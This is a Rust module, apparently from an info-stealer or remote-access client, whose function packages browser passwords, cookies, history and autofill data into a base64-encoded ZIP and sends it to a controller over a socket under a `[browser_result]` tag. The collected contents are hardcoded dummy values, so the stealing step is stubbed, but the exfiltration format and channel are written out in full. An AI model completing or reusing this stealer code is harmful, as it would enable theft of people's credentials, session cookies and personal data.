use std::io::{Cursor, Write};
use base64::{engine::general_purpose::STANDARD, Engine};
use serde_json::json;
use zip::write::FileOptions;
use zip::ZipWriter;

use crate::Sock;
use crate::send;

pub fn collect_browser_data(browser_name: &str, sock: &Sock) {
    let mut buf = Vec::new();
    let cursor = Cursor::new(&mut buf);
    let mut zip = ZipWriter::new(cursor);
    let options = FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(0o755);

    // Dummy data counts
    let pass_count = 15;
    let cookie_count = 124;
    let history_count = 850;
    let autofill_count = 42;

    // password.txt
    let _ = zip.start_file("password.txt", options);
    let _ = zip.write_all(b"url: https://example.com\nuser: admin\npass: password123\n\n");
    let _ = zip.write_all(b"url: https://google.com\nuser: jules\npass: secret\n");

    // cookie.txt
    let _ = zip.start_file("cookie.txt", options);
    let _ = zip.write_all(b"example.com\tTRUE\t/\tFALSE\t1735689600\tsession_id\tabcdef123456\n");

    // history.txt
    let _ = zip.start_file("history.txt", options);
    let _ = zip.write_all(b"2023-10-27 10:00:00 - https://github.com - GitHub\n");
    let _ = zip.write_all(b"2023-10-27 10:05:00 - https://google.com - Google\n");

    // autofill.txt
    let _ = zip.start_file("autofill.txt", options);
    let _ = zip.write_all(b"Name: Jules\nEmail: jules@example.com\nAddress: 123 Main St\n");

    let _ = zip.finish();
    drop(zip);

    let b64 = STANDARD.encode(&buf);

    let result = json!({
        "success": true,
        "browser": browser_name,
        "passwords": pass_count,
        "cookies": cookie_count,
        "history": history_count,
        "autofill": autofill_count,
        "zip": b64
    });

    send(sock, &format!("[browser_result]{}", result));
}
